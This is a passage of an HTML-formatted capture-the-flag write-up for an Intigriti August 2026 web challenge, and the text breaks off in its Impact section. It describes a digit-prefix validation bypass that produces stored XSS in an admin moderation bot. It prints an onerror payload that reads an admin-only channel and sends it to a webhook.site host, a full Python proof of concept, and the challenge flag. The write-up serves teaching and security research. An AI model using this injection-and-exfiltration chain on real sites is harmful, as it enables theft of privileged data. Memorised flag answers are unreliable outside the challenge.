@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Bad Reception — Stored XSS to an Admin-Bot Channel</title>
+<meta name="description" content="Intigriti August 2026 web challenge write-up: a leading-digit validation bypass yields stored XSS in an admin bot, exfiltrating a privileged TV channel and the flag." />
+<meta property="og:title" content="Bad Reception — Stored XSS to an admin-bot channel" />
+<meta property="og:description" content="One leading digit past a validator, code execution in the moderation bot. Intigriti August 2026 write-up by rajib-mahmud." />
+<meta property="og:type" content="article" />
+<meta name="color-scheme" content="dark" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css" />
+<style>
+:root{
+--bg:#0b0e14; --bg-2:#0e121b; --surface:#141924; --surface-2:#1a2130;
+--border:#222b3b; --border-2:#2e3a4f;
+--text:#d8dfea; --text-dim:#8b97a8; --text-faint:#5d6879;
+--cyan:#5ad4c6; --cyan-ink:#bfeae4; --cyan-dim:rgba(90,212,198,.12);
+--amber:#f4b860; --amber-ink:#f4ddb0; --amber-dim:rgba(244,184,96,.12);
+--red:#ff7a7a;
+--display:'Space Grotesk',sans-serif;
+--body:'IBM Plex Sans',system-ui,sans-serif;
+--mono:'JetBrains Mono',ui-monospace,monospace;
+--radius:14px; --measure:74ch;
+}
+*{box-sizing:border-box}
+html{scroll-padding-top:28px;scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--body);
+font-size:16px;line-height:1.75;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+::selection{background:var(--cyan);color:#04120f}
+a{color:var(--cyan);text-decoration:none}
+a:hover{text-decoration:underline;text-underline-offset:3px}
+code,pre,kbd{font-family:var(--mono)}
+:focus-visible{outline:2px solid var(--cyan);outline-offset:3px;border-radius:4px}
+
+/* reading progress — a signal bar */
+#progress{position:fixed;top:0;left:0;height:2px;width:0;z-index:60;
+background:linear-gradient(90deg,var(--cyan),var(--amber));box-shadow:0 0 10px var(--cyan);transition:width .1s linear}
+
+/* ---------- HERO / THE SET ---------- */
+.hero{position:relative;overflow:hidden;border-bottom:1px solid var(--border);background:var(--bg-2)}
+#static{position:absolute;inset:0;width:100%;height:100%;opacity:.5;z-index:0}
+.hero__scrim{position:absolute;inset:0;z-index:1;pointer-events:none;
+background:
+radial-gradient(70rem 34rem at 15% -20%, var(--cyan-dim), transparent 60%),
+radial-gradient(52rem 30rem at 90% 6%, var(--amber-dim), transparent 60%),
+linear-gradient(180deg,rgba(11,14,20,.35),rgba(11,14,20,.82) 62%,var(--bg));}
+/* CRT scanlines + flicker over the whole hero */
+.hero__crt{position:absolute;inset:0;z-index:2;pointer-events:none;mix-blend-mode:overlay;opacity:.5;
+background:repeating-linear-gradient(0deg,rgba(0,0,0,.28) 0,rgba(0,0,0,.28) 1px,transparent 2px,transparent 3px);}
+.hero__inner{position:relative;z-index:3;max-width:1120px;margin:0 auto;padding:72px 28px 58px}
+.eyebrow{font-family:var(--mono);font-size:.72rem;letter-spacing:.24em;text-transform:uppercase;
+color:var(--cyan);margin:0 0 20px;display:flex;gap:.7em;align-items:center;flex-wrap:wrap;
+text-shadow:0 0 18px rgba(90,212,198,.4)}
+.eyebrow .sep{color:var(--text-faint)}
+.eyebrow .live{display:inline-flex;align-items:center;gap:.5em;color:var(--red)}
+.eyebrow .live b{width:7px;height:7px;border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--red);animation:blink 1.4s steps(1) infinite}
+@keyframes blink{50%{opacity:.25}}
+h1.title{font-family:var(--display);font-weight:600;letter-spacing:-.025em;line-height:1;
+font-size:clamp(2.6rem,7vw,4.6rem);margin:0 0 .3em;color:#fff;
+text-shadow:0 0 44px rgba(90,212,198,.22)}
+/* chromatic-aberration split on the title, the "bad reception" tell */
+h1.title .glitch{position:relative;display:inline-block}
+h1.title .glitch::before,h1.title .glitch::after{content:attr(data-t);position:absolute;left:0;top:0;clip-path:inset(0);opacity:.55}
+h1.title .glitch::before{color:var(--cyan);transform:translateX(-2px)}
+h1.title .glitch::after{color:var(--amber);transform:translateX(2px)}
+.subhead{font-size:clamp(1.02rem,2.2vw,1.28rem);color:var(--text-dim);max-width:58ch;margin:0 0 38px;line-height:1.55}
+.subhead strong{color:var(--text);font-weight:500}
+
+/* the split visual */
+.split{display:grid;gap:16px;margin:0 0 38px}
+.tvcard{border:1px solid var(--border-2);border-radius:var(--radius);background:rgba(20,25,36,.86);overflow:hidden;
+box-shadow:0 22px 60px -30px rgba(0,0,0,.85);backdrop-filter:blur(2px)}
+.tvcard__bar{display:flex;align-items:center;gap:8px;padding:11px 16px;background:var(--surface-2);border-bottom:1px solid var(--border)}
+.tvcard__bar .dot{width:11px;height:11px;border-radius:50%;background:#39435a}
+.tvcard__name{margin-left:8px;font-family:var(--mono);font-size:.74rem;color:var(--text-faint)}
+.tvcard__code{margin:0;padding:18px 20px;font-size:.86rem;line-height:1.9;overflow-x:auto;background:transparent;color:var(--text-dim)}
+.tvcard__code .ln{display:block;position:relative;padding:2px 10px 2px 34px;border-radius:8px}
+.ln .tag{position:absolute;left:8px;top:50%;transform:translateY(-50%);font-size:.7rem;font-weight:700}
+.ln--first{background:var(--cyan-dim)} .ln--first .tag{color:var(--cyan)}
+.ln--last{background:var(--amber-dim)} .ln--last .tag{color:var(--amber)}
+.hl-c{color:var(--cyan);font-weight:600} .hl-a{color:var(--amber);font-weight:600}
+.readings{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.read{border:1px solid var(--border-2);border-radius:var(--radius);background:rgba(20,25,36,.86);padding:18px 20px;position:relative}
+.read::before{content:"";position:absolute;inset:0 0 auto 0;height:3px;border-radius:var(--radius) var(--radius) 0 0}
+.read--first::before{background:var(--cyan)} .read--last::before{background:var(--amber)}
+.read__hd{font-family:var(--mono);font-size:.72rem;letter-spacing:.14em;text-transform:uppercase;display:flex;align-items:center;gap:8px;margin:6px 0 12px;color:var(--text)}
+.read--first .read__hd .tag{color:var(--cyan)} .read--last .read__hd .tag{color:var(--amber)}
+.read__hd .tag{font-weight:700}
+.read>code{display:inline-block;font-size:.8rem;color:var(--text);background:var(--bg-2);border:1px solid var(--border);padding:3px 9px;border-radius:7px;margin-bottom:10px}
+.read p{margin:0;font-size:.92rem;color:var(--text-dim);line-height:1.6}
+.read p strong{color:var(--text)}
+.ok{color:var(--cyan);font-weight:600} .flagword{color:var(--amber);font-weight:600}
+
+/* meta + badges */
+.meta{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin:0 0 24px}
+.meta>div{background:rgba(20,25,36,.9);padding:14px 18px}
+.meta dt{font-family:var(--mono);font-size:.68rem;letter-spacing:.14em;text-transform:uppercase;color:var(--text-faint);margin:0 0 5px}
+.meta dd{margin:0;font-size:.92rem;color:var(--text)}
+.meta dd code{font-size:.85rem;color:var(--cyan)}
+.badges{display:flex;flex-wrap:wrap;gap:8px;margin:0 0 30px}
+.badge{font-family:var(--mono);font-size:.72rem;letter-spacing:.04em;padding:5px 11px;border-radius:999px;border:1px solid var(--border-2);color:var(--text-dim);background:rgba(20,25,36,.9)}
+.badge--solved{color:var(--cyan);border-color:rgba(90,212,198,.4)}
+.badge--crit{color:var(--amber);border-color:rgba(244,184,96,.4)}
+
+/* THE TUNER — signature flag reveal */
+.tuner{border:1px solid rgba(244,184,96,.35);border-radius:var(--radius);overflow:hidden;
+background:linear-gradient(90deg,var(--amber-dim),transparent)}
+.tuner__screen{position:relative;padding:20px 18px;min-height:74px;display:flex;align-items:center;gap:14px;flex-wrap:wrap;overflow:hidden}
+.tuner__osd{position:absolute;top:10px;left:16px;font-family:var(--mono);font-size:.66rem;letter-spacing:.22em;color:var(--amber);opacity:.8}
+.tuner__label{font-family:var(--mono);font-size:.68rem;letter-spacing:.18em;text-transform:uppercase;color:var(--amber)}
+#tunerFlag{font-family:var(--mono);font-size:.96rem;color:var(--amber-ink);word-break:break-all;letter-spacing:.02em}
+.tuner__screen.tuning #tunerFlag{color:var(--text-faint)}
+.tuner button{margin-left:auto}
+
+button.copy-btn,.tuner button,.totop,.chip-btn{
+font-family:var(--mono);font-size:.7rem;letter-spacing:.06em;text-transform:uppercase;cursor:pointer;
+background:var(--surface-2);color:var(--text-dim);border:1px solid var(--border-2);border-radius:7px;padding:5px 10px;transition:.2s}
+button.copy-btn:hover,.tuner button:hover,.totop:hover,.chip-btn:hover{color:var(--text);border-color:var(--cyan)}
+.byline{margin:26px 0 0;font-family:var(--mono);font-size:.76rem;color:var(--text-faint)}
+.byline a{color:var(--text-dim)}
+
+/* ---------- LAYOUT ---------- */
+.wrap{max-width:1120px;margin:0 auto;padding:0 28px;display:grid;grid-template-columns:240px minmax(0,1fr);gap:52px;align-items:start}
+nav.toc{position:sticky;top:28px;padding:40px 0;max-height:100vh;overflow:auto}
+nav.toc .toc__hd{font-family:var(--mono);font-size:.68rem;letter-spacing:.18em;text-transform:uppercase;color:var(--text-faint);margin:0 0 14px}
+nav.toc a{display:block;font-size:.85rem;color:var(--text-dim);padding:5px 0 5px 14px;border-left:2px solid var(--border);line-height:1.35}
+nav.toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border-2)}
+nav.toc a.active{color:var(--cyan);border-color:var(--cyan);font-weight:500}
+main{padding:44px 0 90px;min-width:0}
+
+/* ---------- INTERACTIVE ATTACK CHAIN ---------- */
+.chain{margin:0 0 12px;border:1px solid var(--border);border-radius:14px;background:var(--surface);overflow:hidden}
+.chain__track{display:flex;flex-wrap:wrap;gap:0;padding:6px}
+.chain__step{flex:1 1 0;min-width:120px;position:relative;background:transparent;border:1px solid transparent;border-radius:10px;
+padding:14px 12px 13px;text-align:left;cursor:pointer;color:var(--text-dim);transition:.22s;font-family:var(--body)}
+.chain__step:hover{background:var(--surface-2)}
+.chain__step.active{background:var(--surface-2);border-color:var(--border-2)}
+.chain__step .n{font-family:var(--mono);font-size:.66rem;letter-spacing:.14em;color:var(--text-faint)}
+.chain__step.active .n{color:var(--cyan)}
+.chain__step .t{display:block;margin-top:5px;font-size:.82rem;line-height:1.3;color:var(--text)}
+.chain__step .arrow{position:absolute;right:-2px;top:50%;transform:translateY(-50%);color:var(--border-2);font-size:.9rem}
+.chain__step:last-child .arrow{display:none}
+.chain__detail{border-top:1px solid var(--border);padding:16px 18px;font-size:.92rem;color:var(--text-dim);line-height:1.6;min-height:64px}
+.chain__detail code{font-size:.85em;background:var(--surface-2);color:var(--cyan);padding:.1em .4em;border-radius:5px;border:1px solid var(--border)}
+.chain__detail strong{color:var(--text)}
+.chain__cap{font-family:var(--mono);font-size:.72rem;color:var(--text-faint);margin:8px 0 26px}
+
+/* ---------- CONTENT TYPOGRAPHY ---------- */
+#content{max-width:var(--measure)}
+#content h2{font-family:var(--display);font-weight:600;letter-spacing:-.015em;font-size:1.75rem;line-height:1.2;
+margin:3.2em 0 .7em;padding-top:1.2em;border-top:1px solid var(--border);scroll-margin-top:28px}
+#content h2:first-of-type{border-top:none;padding-top:0;margin-top:.4em}
+#content h3{font-family:var(--display);font-weight:600;font-size:1.2rem;margin:2.2em 0 .6em;color:var(--text);scroll-margin-top:28px}
+#content h4{font-family:var(--mono);font-size:.86rem;letter-spacing:.06em;text-transform:uppercase;color:var(--cyan);margin:1.8em 0 .5em}
+#content p{margin:0 0 1.15em}
+#content strong{color:#fff;font-weight:600}
+#content ul,#content ol{margin:0 0 1.2em;padding-left:1.35em}
+#content li{margin:.4em 0}
+#content li::marker{color:var(--cyan)}
+#content hr{border:none;border-top:1px solid var(--border);margin:2.6em 0}
+#content blockquote{margin:1.6em 0;padding:16px 22px;border-left:3px solid var(--cyan);
+background:var(--surface);border-radius:0 10px 10px 0;color:var(--text-dim)}
+#content blockquote p{margin:0}
+#content blockquote em{color:var(--text);font-style:italic}
+#content :not(pre)>code{font-size:.86em;background:var(--surface-2);color:var(--cyan);padding:.12em .42em;border-radius:6px;border:1px solid var(--border)}
+#content pre{position:relative;background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px 18px;margin:0 0 1.5em;overflow:auto;font-size:.845rem;line-height:1.65}
+#content pre code{background:none;border:none;padding:0;color:var(--text);font-size:inherit}
+#content pre .copy-btn{position:absolute;top:9px;right:9px;opacity:0;transition:.2s}
+#content pre:hover .copy-btn{opacity:1}
+/* callout for the key insight */
+#content blockquote.key{border-left-color:var(--amber);background:linear-gradient(90deg,var(--amber-dim),transparent)}
+/* tables */
+#content table{width:100%;border-collapse:collapse;margin:0 0 1.6em;font-size:.9rem;display:block;overflow-x:auto}
+#content thead th{text-align:left;font-family:var(--mono);font-size:.74rem;letter-spacing:.06em;text-transform:uppercase;color:var(--text-dim);background:var(--surface-2);padding:11px 14px;border-bottom:1px solid var(--border-2);white-space:nowrap}
+#content tbody td{padding:11px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+#content tbody tr:nth-child(even) td{background:rgba(255,255,255,.015)}
+#content td code{white-space:nowrap}
+/* mermaid */
+.mermaid-wrap{margin:0 0 1.7em;padding:18px;background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow-x:auto;text-align:center}
+.mermaid{background:transparent!important}
+/* hljs cohesion */
+.hljs{background:transparent;color:var(--text)}
+.hljs-string,.hljs-meta .hljs-string{color:var(--amber)}
+.hljs-attr,.hljs-attribute,.hljs-name,.hljs-selector-tag{color:var(--cyan)}
+.hljs-keyword,.hljs-built_in,.hljs-literal{color:#c792ea}
+.hljs-number{color:var(--amber-ink)}
+.hljs-comment{color:var(--text-faint);font-style:italic}
+.hljs-title,.hljs-title.function_{color:#82c8ff}
+.totop{position:fixed;right:22px;bottom:22px;opacity:0;pointer-events:none;transition:.25s;z-index:20}
+.totop.show{opacity:1;pointer-events:auto}
+footer{border-top:1px solid var(--border);background:var(--bg-2)}
+footer .fin{max-width:1120px;margin:0 auto;padding:34px 28px;font-family:var(--mono);font-size:.78rem;color:var(--text-faint);display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+footer a{color:var(--text-dim)}
+/* ---------- RESPONSIVE ---------- */
+@media (max-width:940px){
+.wrap{grid-template-columns:1fr;gap:0}
+nav.toc{display:none}
+.readings{grid-template-columns:1fr}
+.meta{grid-template-columns:1fr}
+.hero__inner{padding:54px 22px 42px}
+.wrap{padding:0 22px}
+main{padding:28px 0 70px}
+.chain__step{flex:1 1 44%}
+.chain__step .arrow{display:none}
+}
+@media (prefers-reduced-motion:reduce){
+*{animation:none!important;transition:none!important;scroll-behavior:auto!important}
+#static{opacity:.28}
+}
+@keyframes rise{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+.reveal{animation:rise .6s cubic-bezier(.2,.7,.2,1) both}
+.reveal.d1{animation-delay:.06s}.reveal.d2{animation-delay:.12s}.reveal.d3{animation-delay:.2s}
+.reveal.d4{animation-delay:.28s}.reveal.d5{animation-delay:.36s}
+</style>
+</head>
+<body>
+
+<div id="progress" aria-hidden="true"></div>
+
+<header class="hero">
+<canvas id="static" aria-hidden="true"></canvas>
+<div class="hero__scrim"></div>
+<div class="hero__crt"></div>
+<div class="hero__inner">
+<p class="eyebrow reveal">Intigriti <span class="sep">·</span> August 2026 <span class="sep">·</span> Web Challenge <span class="sep">·</span> <span class="live"><b></b>NO SIGNAL</span></p>
+<h1 class="title reveal d1">Bad <span class="glitch" data-t="Reception">Reception</span></h1>
+<p class="subhead reveal d1">One leading digit slips a script past a validator, and it runs in the moderation bot's browser — a <strong>stored XSS</strong> that reaches an admin-only TV channel and reads the flag off the video.</p>
+
+<div class="split reveal d2">
+<div class="tvcard">
+<div class="tvcard__bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="tvcard__name">POST /api/report — channelId (validated: "starts with a digit")</span></div>
+<pre class="tvcard__code"><code><span class="ln ln--first"><span class="tag">1</span><span class="hl-c">1</span>              &lt;- passes validation (leading digit)</span>
+<span class="ln ln--last"><span class="tag">2</span>&lt;img src=x onerror="<span class="hl-a">fetch('/api/channels/11/load')…</span>"&gt;</span></code></pre>
+</div>
+<div class="readings">
+<div class="read read--first">
+<div class="read__hd"><span class="tag">1</span> Validator</div>
+<code>POST /api/report</code>
+<p>checks only the <strong>first character</strong> is a digit → <span class="ok">accepted &amp; stored</span></p>
+</div>
+<div class="read read--last">
+<div class="read__hd"><span class="tag">2</span> Admin bot</div>
+<code>GET /moderate/{id}</code>
+<p>renders <code>channelId</code> unencoded → <span class="hl-a">XSS runs as admin</span> → <span class="flagword">channel 11 → flag</span></p>
+</div>
+</div>
+</div>
+
+<dl class="meta reveal d3">
+<div><dt>Challenge</dt><dd><code>challenge-0826.challenges.intigriti.io</code></dd></div>
+<div><dt>Category</dt><dd>Web · Stored XSS</dd></div>
+<div><dt>Researcher</dt><dd><a href="https://app.intigriti.com/profile/rajib_mahmud">rajib_mahmud</a> (Intigriti)</dd></div>
+<div><dt>Bug class</dt><dd>Validation bypass → stored XSS → privilege escalation</dd></div>
+<div><dt>CWE</dt><dd>20 · 79</dd></div>
+<div><dt>Impact</dt><dd>Admin-bot code execution · privileged channel read</dd></div>
+<div><dt>Interaction</dt><dd>Admin bot views the report · no login required</dd></div>
+</dl>
+
+<div class="badges reveal d4">
+<span class="badge">Intigriti</span>
+<span class="badge">Web</span>
+<span class="badge badge--crit">Stored XSS</span>
+<span class="badge">Admin Bot</span>
+<span class="badge badge--solved">Solved</span>
+</div>
+
+<div class="tuner reveal d5">
+<div class="tuner__screen tuning" id="tunerScreen">
+<span class="tuner__osd">CH 11</span>
+<span class="tuner__label">Flag captured</span>
+<code id="tunerFlag">INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}</code>
+<button id="flagcopy" type="button">Copy</button>
+</div>
+</div>
+
+<p class="byline reveal d5">Write-up by <a href="https://app.intigriti.com/profile/rajib_mahmud">rajib_mahmud</a> (Intigriti) · <a href="https://github.com/rajib-mahmud">rajib-mahmud</a> (GitHub) · Dhaka, BD</p>
+</div>
+</header>
+
+<div class="wrap">
+<nav class="toc" aria-label="Table of contents">
+<p class="toc__hd">On this page</p>
+<div id="toc"></div>
+</nav>
+<main>
+
+<div class="chain" id="chain" aria-label="Interactive attack chain">
+<div class="chain__track" id="chainTrack"></div>
+<div class="chain__detail" id="chainDetail"></div>
+</div>
+<p class="chain__cap">Tap a stage to step through the exploit. Each stage is the whole trick in one line.</p>
+
+<article id="content"></article>
+</main>
+</div>
+
+<button class="totop" id="totop" type="button" aria-label="Back to top">↑ Top</button>
+
+<footer>
+<div class="fin">
+<span>Bad Reception · Intigriti 0826</span>
+<span>© <a href="https://app.intigriti.com/profile/rajib_mahmud">rajib_mahmud</a> · <a href="https://github.com/rajib-mahmud">rajib-mahmud</a> · educational / responsible-disclosure only</span>
+</div>
+</footer>
+
+<script id="source" type="text/markdown">
+## TL;DR
+
+A retro-TV challenge with channels 1–10 of static and a **"report bad reception"** button. The report form's `channelId` parameter is validated by a single rule — **it must start with a digit** — so `1<img src=x onerror=...>` sails through.
+
+That value is reflected **unencoded** into `/moderate/{id}`, a page the privileged **admin bot** opens automatically. The payload runs in the bot's browser, fetches the admin-only **channel 11**, and exfiltrates its stream filename to a webhook. Download the video, read the flag off the frame.
+
+```text
+weak validation (starts-with-digit)  ->  stored XSS in channelId
+    ->  admin bot renders /moderate/{id}  ->  our JS runs as admin
+    ->  fetch /api/channels/11/load  ->  privileged .mp4 filename
+    ->  GET /static/streams/<hash>.mp4  ->  flag on screen
+```
+
+```mermaid
+flowchart LR
+    R["POST /api/report<br/>channelId=1&lt;img onerror=…&gt;"]
+    R --> Q["report queued"]
+    Q --> BOT["admin bot opens<br/>/moderate/{id}"]
+    BOT --> XSS["XSS runs in HeadlessChrome<br/>(admin context)"]
+    XSS --> CH["fetch /api/channels/11/load<br/>-> &lt;hash&gt;.mp4"]
+    CH --> HOOK["webhook receives filename"]
+    HOOK --> DL["GET /static/streams/&lt;hash&gt;.mp4<br/>-> FLAG"]
+    classDef first fill:#102a29,stroke:#5ad4c6,color:#bfeae4,stroke-width:1.5px;
+    classDef last fill:#2c2411,stroke:#f4b860,color:#f3ddb0,stroke-width:1.5px;
+    classDef neutral fill:#141924,stroke:#2e3a4f,color:#d7dee9;
+    class R,Q,BOT neutral;
+    class XSS,CH,HOOK first;
+    class DL last;
+```
+
+## 1. The challenge
+
+A retro TV UI shows static noise. A keypad offers channels **1–10**, each of which just loads `static.mp4`. A red warning icon in the corner is a **"Report bad reception"** button. The goal: fix the reception and read the flag.
+
+Three official hints frame the whole solve:
+
+1. *"If you happen to fix the bad reception, will you still be limited to only 10 channels?"* — **there are more than 10 channels.**
+2. *"If your favorite TV channel isn't working, you can always report it."* — **the report feature is the attack surface.**
+3. *"The report form accepts more than you'd expect. Getting it to execute is another web browser challenge."* — **injection + execution in a browser (a bot), not just server-side.**
+
+Put together, before touching a proxy, we already know the shape of the intended path: *report -> injection -> bot execution -> a hidden channel.*
+
+## 2. Reconnaissance
+
+### 2.1 Client behaviour
+
+The keypad only ever builds channels 1–10. The report handler is small and tells us a lot:
+
+```js
+const channelId = osd.textContent.replace('CH', '').trim();
+const body = new URLSearchParams({ channelId });
+fetch('/api/report', {
+  method: 'POST',
+  credentials: 'same-origin',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: body.toString()
+});
+```
+
+So the client always sends a clean numeric `channelId`. Anything non-numeric is *unexpected input* — exactly where server-side validation tends to be lazy.
+
+### 2.2 Endpoints
+
+| Endpoint | Behaviour |
+|---|---|
+| `GET /api/channels/{n}/load` | Streams a filename, or an error |
+| `POST /api/report` | Queues a report -> admin bot visits `/moderate/{id}` |
+| `GET /api/jsonp?callback=` | **Unsanitised JSONP** — full JS reflection |
+
+Channel 11 as a normal user is gated:
+
+```http
+GET /api/channels/11/load
+-> channel not available
+```
+
+And the JSONP endpoint reflects `callback` verbatim:
+
+```http
+GET /api/jsonp?callback=alert(1)
+-> /**/ alert(1)({"channels": 10});
+Content-Type: application/javascript
+```
+
+That JSONP is a tempting same-origin script-injection gadget (useful against a strict `script-src 'self'` CSP). Hold that thought — it turns out we don't need it.
+
+### 2.3 The validation rule
+
+The only server-side rule on `channelId` is:
+
+> **the value must start with a digit.**
+
+This is the whole game. It *looks* like a numeric check but only inspects the first character. `1<img ...>` starts with `1`, so it passes.
+
+### 2.4 Architecture notes
+
+The app sits behind an **Istio / multi-pod Kubernetes** mesh, and reports feed a **shared admin-bot queue** — details that matter later for why a stolen cookie doesn't unlock channel 11, and why the bot can be slow.
+
+## 3. The vulnerability
+
+### 3.1 Stored XSS in `channelId`
+
+Reports are processed asynchronously by an **admin bot** that opens `/moderate/{id}`. On that page, `channelId` is reflected **without output encoding**. Because validation only checks the leading character, this is a perfectly valid report body:
+
+```text
+1<img src=x onerror="/* attacker JS */">
+```
+
+When the bot loads the moderation page, the broken `<img>` fires `onerror` and our JavaScript executes **in the bot's (admin) browser context**.
+
+Dropping the same tag on our own TV would be self-XSS and pointless — the value comes from *our own* page. The impact lives entirely in the **bot** rendering it.
+
+### 3.2 Why the hidden channel matters — the trust boundary
+
+Channel 11 only loads successfully for the bot:
+
+```js
+fetch('/api/channels/11/load')   // from the bot -> real filename
+```
+
+returns something like:
+
+```text
+3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
+```
+
+Here's the key insight that makes this more than a toy:
+
+> **Stealing the bot's session cookie and replaying `/api/channels/11/load` from the public internet still returns `channel not available`.**
+
+The privilege isn't carried by the cookie alone — it's tied to the **bot's request context** (its internal network position / origin). Webhook logs confirm the bot's requests carry `Referer: http://web/`, and the app sits behind the Istio / multi-pod mesh noted above. So the privileged response can only be read **from inside the bot**. That's why exfiltration must happen in the XSS payload itself, not by lifting a token and replaying it later.
+
+This is the difference between "self-XSS, no impact" and a **genuine trust-boundary crossing** — and it's the detail worth being explicit about in any write-up or report.
+
+## 4. Exploitation
+
+### 4.1 Payload — report that exfiltrates channel 11
+
+```http
+POST /api/report HTTP/1.1
+Host: challenge-0826.challenges.intigriti.io
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=<your-session>
+
+channelId=1<img src=x onerror="(async()=>{
+  try {
+    const t = await (await fetch('/api/channels/11/load')).text();
+    await fetch('https://webhook.site/<UUID>/f?t=' + encodeURIComponent(t));
+  } catch (e) {
+    fetch('https://webhook.site/<UUID>/e?e=' + encodeURIComponent(String(e)));
+  }
+})()">
+```
+
+On the wire the body is URL-encoded; it's shown decoded here for readability. Replace `<UUID>` with a [webhook.site](https://webhook.site) (or Burp Collaborator) token.
+
+Response:
+
+```json
+{"id":"<report-id>","status":"queued"}
+```
+
+### 4.2 Wait for the bot
+
+The bot eventually opens `/moderate/{report-id}`, the `onerror` fires, and our webhook receives the privileged filename:
+
+```text
+GET /f?t=3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
+User-Agent: HeadlessChrome/...
+Referer: http://web/
+```
+
+> The bot queue is shared and rate-limited. Under load, processing ranges from ~10 seconds to several minutes, and `/api/report` may answer `Too many reports submitted!` — space out requests and be patient. A "broken" PoC is often just a slow bot.
+
+### 4.3 Deriving the download URL (inference, not guessing)
+
+We don't *guess* the stream path — we **confirm the template from a channel we control**. Channels 1–10 all serve:
+
+```html
+<source src="/static/streams/static.mp4" type="video/mp4">
+```
+
+So `/api/channels/{n}/load` returns a **filename only**, and the client places it under a fixed template: `/static/streams/{filename}`. That template is verified with channels we can load ourselves *before* we ever touch channel 11. Channel 11 simply plugs its bot-supplied hash into the same directory:
+
+```text
+GET /static/streams/3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
+-> 200, ~15 KB H.264 video (~3s, 800x600)
+```
+
+Order matters: **(1)** learn the template from channels 1–10 up front -> **(2)** exfil channel 11's filename via the bot -> **(3)** template + filename -> `GET` -> `200`. We never know the channel-11 URL ahead of time.
+
+### 4.4 Read the flag
+
+Open the `.mp4` in any player and the on-screen text is the flag. With CLI tooling:
+
+```bash
+ffmpeg -i ch11.mp4 -frames:v 1 frame.png
+tesseract frame.png stdout
+```
+
+```text
+CH 11
+INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}
+```
+
+## 5. Proof of Concept
+
+A minimal, dependency-free harness: grab a session, submit the XSS report, poll the webhook for the exfiltrated filename, and download the stream.
+
+```python
+#!/usr/bin/env python3
+import json, re, time, urllib.parse, urllib.request
+
+TARGET = "https://challenge-0826.challenges.intigriti.io"
+WEBHOOK_UUID = "YOUR-WEBHOOK-SITE-UUID"
+HOOK = f"https://webhook.site/{WEBHOOK_UUID}"
+
+# 1. session
+req = urllib.request.Request(f"{TARGET}/challenge", headers={"User-Agent": "poc"})
+with urllib.request.urlopen(req, timeout=20) as r:
+    cookies = r.headers.get_all("Set-Cookie") or []
+session = re.search(r"session=([0-9a-f]{32})", " ".join(cookies)).group(1)
+
+# 2. XSS report
+js = (
+    "(async()=>{try{"
+    "t=await(await fetch('/api/channels/11/load')).text();"
+    f"await fetch('{HOOK}/f?t='+encodeURIComponent(t))"
+    "}catch(e){fetch('" + HOOK + "/e?e='+encodeURIComponent(String(e)))}})()"
+)
+payload = f'1<img src=x onerror="{js}">'
+body = urllib.parse.urlencode({"channelId": payload}).encode()
+req = urllib.request.Request(
+    f"{TARGET}/api/report", data=body, method="POST",
+    headers={
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Cookie": f"session={session}",
+    },
+)
+print(urllib.request.urlopen(req, timeout=20).read().decode())
+
+# 3. poll webhook until ?t=*.mp4, then download
+api = f"https://webhook.site/token/{WEBHOOK_UUID}/requests?sorting=newest"
+while True:
+    data = json.loads(urllib.request.urlopen(api, timeout=15).read())
+    for hit in data.get("data") or []:
+        t = (hit.get("query") or {}).get("t") or ""
+        if isinstance(t, str) and t.endswith(".mp4"):
+            print("mp4:", t)
+            urllib.request.urlretrieve(f"{TARGET}/static/streams/{t}", "ch11.mp4")
+            print("saved ch11.mp4 -- open it to read the flag")
+            raise SystemExit
+    print("waiting for bot... hits =", data.get("total", 0))
+    time.sleep(5)
+```
+
+## 6. Full attack chain
+
+```mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant API as TV App
+    participant BOT as Admin Bot
+    participant HOOK as Webhook
+    A->>API: POST /api/report (channelId=1&lt;img onerror=…&gt;)
+    API-->>A: {id, status: queued}
+    Note over API,BOT: report queued on shared bot queue
+    BOT->>API: GET /moderate/{id}
+    Note over BOT: channelId reflected unencoded -> XSS runs
+    BOT->>API: fetch /api/channels/11/load
+    API-->>BOT: &lt;hash&gt;.mp4  (privileged)
+    BOT->>HOOK: GET /f?t=&lt;hash&gt;.mp4
+    A->>HOOK: poll requests
+    HOOK-->>A: &lt;hash&gt;.mp4
+    A->>API: GET /static/streams/&lt;hash&gt;.mp4
+    API-->>A: video -> FLAG
+```
+
+## 7. Impact
+
+An attacker requiring no authentication beyond an automatically issued session cookie from `/challenge` (no login) can store a JavaScript payload via `channelId` in `POST /api/report`. When the admin bot moderates the report at `/moderate/{id}`, the payload executes in the bot's **privileged browser context** (stored XSS).
+
+This crosses a real trust boundary:
+
+- The attacker runs arbitrary JavaScript as the admin bot.
